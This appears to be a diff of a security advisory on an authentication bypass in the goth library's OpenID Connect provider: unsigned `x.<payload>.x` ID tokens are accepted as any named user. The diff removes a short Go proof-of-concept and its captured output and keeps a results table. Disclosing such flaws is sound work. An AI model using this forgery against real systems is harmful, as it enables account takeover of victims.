@@ -38,39 +38,13 @@ in the supplied HTTP client) returns `x.<base64url payload>.x` as the `id_token`
 `sub`, `email` and `name` in the payload. `FetchUser` returns a fully populated `goth.User` for that
 victim identity, and **the attacker is logged in as anyone they name**.
 
-### What we ran
-
-The full public flow against a local identity provider whose token endpoint returns the forged
-`id_token`, on `github.com/markbates/goth` built from `1.82.0 @ 6c7fc31`. Condensed from
-`poc/main.go`, with the same calls and arguments:
-
-```go
-provider, _ := openidConnect.New(clientKey, clientSecret, callbackURL,
-    issuer+"/.well-known/openid-configuration", "openid", "email", "profile")
-sess, _ := provider.BeginAuth("state-123")
-sess.Authorize(provider, url.Values{"code": {"attacker-authorization-code"}})
-user, err := provider.FetchUser(sess) // the id_token was "x.<payload>.x"
-```
-
 | Input to `FetchUser` | 1.82.0 @ 6c7fc31 |
 |---|---|
 | control: genuinely signed ES256 ID token, same claims | accepted, but no forgery occurred: a reference verifier accepts it too, and the run states the effect is absent (exit 1) |
 | forged ID token `x.<payload>.x` | **accepted: `UserID="victim-user-12345"`, `Email="victim@example.com"`, `Name="Victim User"`; a reference verifier rejects it (exit 0)** |
 
-Captured lines (`logs/baseline.stdout.log`):
-
-```
-FetchUser SUCCEEDED on the token from the attacker-controlled token endpoint
-authenticated user: UserID="victim-user-12345" Email="victim@example.com" Name="Victim User" Provider="openid-connect"
-accepted token segments: header="x" payload_len=286 signature="x"
-reference verifier (golang-jwt) rejects the forged token: true
-```
-
-The accepted token's header and signature segments were both the literal `x`; a 286-byte payload
-carrying the victim's claims was all it took.
-
-**Not shown:** a browser round trip, a real identity provider, or network interception; the run's
-local identity provider plays the attacker-controlled token endpoint directly.
+Captured output: `logs/baseline.stdout.log` (forged token) and `logs/control.stdout.log` (genuinely
+signed token).
 
 ### Why this vector
 
